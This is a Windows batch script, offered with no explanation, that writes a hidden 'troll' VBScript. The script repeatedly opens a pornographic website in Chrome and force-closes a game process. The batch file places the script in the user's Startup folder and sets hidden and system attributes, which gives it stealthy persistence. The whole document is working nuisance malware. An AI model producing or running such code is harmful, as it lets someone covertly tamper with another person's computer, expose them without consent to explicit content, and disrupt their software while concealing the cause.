echo Set objShell = CreateObject("WScript.Shell") > %USERPROFILE%\Desktop\troll.vbs
echo WScript.Sleep 600000 >> %USERPROFILE%\Desktop\troll.vbs
echo Do >> %USERPROFILE%\Desktop\troll.vbs
echo     objShell.Run "chrome.exe https://www.javhd.com", 0, True >> %USERPROFILE%\Desktop\troll.vbs
echo     WScript.Sleep 10000 >> %USERPROFILE%\Desktop\troll.vbs
echo     WScript.Sleep 1800000 >> %USERPROFILE%\Desktop\troll.vbs
echo     objShell.Run "taskkill /F /IM gamename.exe", 0, True >> %USERPROFILE%\Desktop\troll.vbs
echo Loop >> %USERPROFILE%\Desktop\troll.vbs

move %USERPROFILE%\Desktop\troll.vbs %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\

attrib +h +s "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\troll.vbs"
